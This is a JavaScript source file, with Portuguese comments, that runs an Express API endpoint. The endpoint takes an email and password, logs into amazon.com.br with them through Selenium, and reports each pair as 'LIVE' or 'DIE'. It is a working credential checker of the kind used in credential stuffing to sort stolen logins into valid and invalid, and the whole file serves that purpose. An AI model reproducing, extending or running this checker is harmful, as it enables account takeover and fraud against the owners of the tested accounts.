import express from 'express';
import { Builder, By, until } from 'selenium-webdriver';
import chrome from 'selenium-webdriver/chrome.js';
import bodyParser from 'body-parser';
import picocolors from 'picocolors';

const app = express();
const port = 5000;

// Middleware para processar JSON
app.use(bodyParser.json());

// Endpoint para checar login
app.post('/api/check-login', async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ error: 'Email e senha são obrigatórios' });
    }

    let options = new chrome.Options();
    options.addArguments('--log-level=3');
    options.addArguments('--disable-logging');
    options.addArguments('--disable-gpu');

    let driver = await new Builder().setChromeOptions(options).forBrowser('chrome').build();

    try {
        // ================= MAIN PAGE TO LOGIN =======================
        await driver.get('https://www.amazon.com.br/');
        let loginButton = await driver.wait(until.elementLocated(By.id('nav-link-accountList')), 10000);
        await loginButton.click();

        // ================== INSERT EMAIL/NUMBER =====================
        let inputEmail = await driver.wait(until.elementLocated(By.id('ap_email')), 10000);
        let continueButton = await driver.wait(until.elementLocated(By.id('continue')), 10000);

        await inputEmail.sendKeys(email);
        await continueButton.click();
        await driver.sleep(5000);

        // Verificar se o email existe
        let textElement = await driver.wait(until.elementLocated(By.tagName('body')), 10000);
        let text = await textElement.getText();

        if (text.includes('Não encontramos uma conta associada a este endereço de e-mail')) {
            console.log(picocolors.red(`[ DIE ] » ${email} » [ Não encontramos uma conta associada a este endereço de e-mail ]`));
            return res.json({ status: 'DIE', message: `Email inválido: ${email}` });
        } else {
            // ================== INSERT PASSWORD =====================
            let inputPassw = await driver.wait(until.elementLocated(By.name('password')), 10000);
            let loginButton = await driver.wait(until.elementLocated(By.id('auth-signin-button')), 10000);

            await inputPassw.sendKeys(password);
            await loginButton.click();
            await driver.sleep(2000);

            textElement = await driver.wait(until.elementLocated(By.tagName('body')), 10000);
            text = await textElement.getText();

            if (text.includes('Sua senha está incorreta')) {
                console.log(picocolors.red(`[ DIE ] » ${email} » [ Login inválido ]`));
                return res.json({ status: 'DIE', message: `Login inválido para: ${email}` });
            } else {
                console.log(picocolors.green(`[ LIVE ] » ${email} » [ Login válido ]`));
                return res.json({ status: 'LIVE', message: `Login bem-sucedido para: ${email}` });
            }
        }
    } catch (error) {
        console.error(picocolors.red(`[ ERROR ] » ${email} » [ Houve um erro: ${error.message} ]`));
        return res.status(500).json({ error: `Erro ao verificar o login: ${error.message}` });
    } finally {
        await driver.quit();
    }
});

// Iniciar o servidor
app.listen(port, () => {
    console.log(`API rodando em http://localhost:${port}`);
});
